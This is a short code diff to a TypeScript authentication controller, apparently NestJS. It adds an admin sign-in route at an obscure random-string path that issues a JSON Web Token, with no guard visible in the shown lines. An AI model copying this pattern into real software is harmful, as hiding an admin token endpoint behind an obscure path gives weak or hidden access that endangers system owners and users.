@@ -23,6 +23,11 @@ export class AuthController {
     return await this.authService.createToken(req.user);
   }
 
+  @Post('local/0958235789sd7fg9as07fas90d8f7')
+  async requestJsonWebTokenAfterLocalAdminSignIn(@Req() req: Request): Promise<IToken> {
+    return await this.authService.createToken(req.user);
+  }
+
   @Post('local/change-password')
   async requestJsonWebTokenAfterLocalChangePass(@Req() req: Request): Promise<IToken> {
     return await this.authService.createToken(req.user);
